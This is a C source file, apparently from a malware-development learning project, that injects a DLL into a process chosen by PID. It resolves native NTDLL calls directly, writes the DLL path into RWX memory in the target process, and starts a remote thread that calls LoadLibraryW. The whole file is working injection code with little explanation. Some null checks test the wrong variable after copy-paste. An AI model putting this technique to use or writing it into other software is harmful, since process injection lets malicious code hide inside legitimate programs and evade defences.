#include "../header.h"
#include "nt_setup.h"

HMODULE get_module(const WCHAR*);
FARPROC get_proc_address(HMODULE, LPCSTR, LPCSTR);


int main(int argc, char** argv){
  int       ret_value = EXIT_SUCCESS;
  NTSTATUS  status;
  DWORD     PID             = 0;
  DWORD     TID             = 0;
  PVOID     rBuffer         = NULL;
  HANDLE    hProcess        = NULL;
  HANDLE    hThread         = NULL;
  HMODULE   hNTDLL          = NULL;
  HMODULE   hKernel32       = NULL;
  HMODULE   hCustomDll      = NULL;
  PVOID     hLoadLibraryW   = NULL;
  
  WCHAR   dll_path[]        = L"...\\Malware Development\\DLL Injection\\dll.dll";
  size_t  dll_path_size     = sizeof(dll_path);
  size_t  bytes_written     = 0;

  if(argc < 2){
    print_err("Insufficient number of arguments");
    print_warn("usage: %s <PID>", argv[0]);
    ret_value = EXIT_FAILURE;
    goto CLEANUP;
  }
  
  PID = atoi(argv[1]);

  OBJECT_ATTRIBUTES OA  = {sizeof(OBJECT_ATTRIBUTES), NULL};
  CLIENT_ID         CID = {(PVOID)PID, NULL};

  hNTDLL = get_module(L"NTDLL");
  if(hNTDLL == NULL) {
    ret_value = EXIT_FAILURE;
    goto CLEANUP;
  }
  
  /* --------[GETTING FUNCTIONS]------- */
  NtOpenProcess nt_open = (NtOpenProcess)get_proc_address(hNTDLL, "NtOpenProcess", "nt_open");
  if(nt_open == NULL) {
    ret_value = EXIT_FAILURE;
    goto CLEANUP;
  }
  NtAllocateVirtualMemory nt_alloc_virtual_mem = (NtAllocateVirtualMemory)get_proc_address(hNTDLL, "NtAllocateVirtualMemory", "nt_alloc_virtual_mem");
  if(nt_alloc_virtual_mem == NULL) {
    ret_value = EXIT_FAILURE;
    goto CLEANUP;
  }
  NtWriteVirtualMemory nt_write_virtual_mem = (NtWriteVirtualMemory)get_proc_address(hNTDLL, "NtWriteVirtualMemory", "nt_write_virtual_mem");
  if(nt_alloc_virtual_mem == NULL) {
    ret_value = EXIT_FAILURE;
    goto CLEANUP;
  }
  NtCreateThreadEx nt_create_thread = (NtCreateThreadEx)get_proc_address(hNTDLL, "NtCreateThreadEx", "nt_create_thread");
  if(nt_alloc_virtual_mem == NULL) {
    ret_value = EXIT_FAILURE;
    goto CLEANUP;
  }
  
  /* --------[KERNEL32]------- */
  hKernel32 = get_module(L"Kernel32");
  if(hNTDLL == NULL) {
    ret_value = EXIT_FAILURE;
    goto CLEANUP;
  }
  hLoadLibraryW = get_proc_address(hKernel32, "LoadLibraryW", "hLoadLibraryW");
  if(hLoadLibraryW == NULL){
    ret_value = EXIT_FAILURE;
    goto CLEANUP;
  }

  /* --------[INJECTION]------- */
  print_info("Getting handle to process (PID: %ld)", PID);
  status = nt_open(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
  if(status != STATUS_SUCCESS) {
    print_err("Failed to get handle to process (PID: %ld). Error: 0x%lx", PID, status);
    goto CLEANUP;
  }
  print_ok("Got handle to process");
  print_info("\\___[\n\t  PID:\t\t%ld\n\t  Address:\t0x%p\n\t]", PID, hProcess);


  print_info("Allocating virtual memory");
  status = nt_alloc_virtual_mem(hProcess, &rBuffer, 0, &dll_path_size, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
  if(status != STATUS_SUCCESS) {
    print_err("Failed to allocate buffer in process memory. Error: 0x%lx", status);
    goto CLEANUP;
  }
  print_ok("Succesfully allocated %zu bytes in process memory", sizeof(dll_path));

  
  print_info("Writing to process memory");
  status = nt_write_virtual_mem(hProcess, rBuffer, dll_path, sizeof(dll_path), &bytes_written);
  if(status != STATUS_SUCCESS) {
    print_err("Failed to write to process memory. Error: 0x%lx", status);
    goto CLEANUP;
  }
  print_ok("Succesfully written %zu bytes to process memory", bytes_written);


  print_info("Creating Thread");
  status = nt_create_thread(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, (PVOID)hLoadLibraryW, rBuffer, 0, 0, 0, 0, NULL);
  if(status != STATUS_SUCCESS) {
    print_err("Failed to create thread. Error: 0x%lx", status);
    goto CLEANUP;
  }
  print_ok("Succesfully got handle to thread");
  print_info("\\___[\n\t Parent:\t:%ld\n\t  Address:\t0x%p\n\t]", PID, hThread);

  print_info("Waiting for thread to finish...");
  WaitForSingleObject(hThread, INFINITE);
  print_ok("Thread finished execution");

CLEANUP:
  print_info("Cleaning up");
  if (hThread) {
      print_info("Closing handle to thread");
      CloseHandle(hThread);
  }
  if (hProcess) {
      print_info("Closing handle to process");
      CloseHandle(hProcess);
  }
  print_ok("Cleaned up");
  return ret_value;
}


HMODULE get_module(const WCHAR* name) {
  HMODULE hModule = NULL;

  print_info("Getting handle to module \"%S\"", name);

  hModule = GetModuleHandleW(name);

  if(hModule == NULL){
    print_err("Failed getting handle to module \"%S\". Error: 0x%lx", name, GetLastError());
  } else {
    print_ok("Got handle to the module");
    print_info("\\___[\n\t  Module:\t%S\n\t  Address:\t0x%p\n\t]", name, hModule);
  }

  return hModule;
}

FARPROC get_proc_address(HMODULE hModule, LPCSTR lpProcName, LPCSTR lpNewName){
  FARPROC proc = GetProcAddress(hModule, lpProcName);
  if(proc == NULL) {
    print_err("Failed to get handle to %s. Error: 0x%lx", lpProcName, GetLastError());
    return NULL;
  }
  print_ok("Got %s", lpProcName);
  print_info("\\___[\n\t  Original:\t%s\n\t  New:\t\t%s\n\t  Address:\t0x%p\n\t]", lpProcName, lpNewName, proc);
  return proc;
}
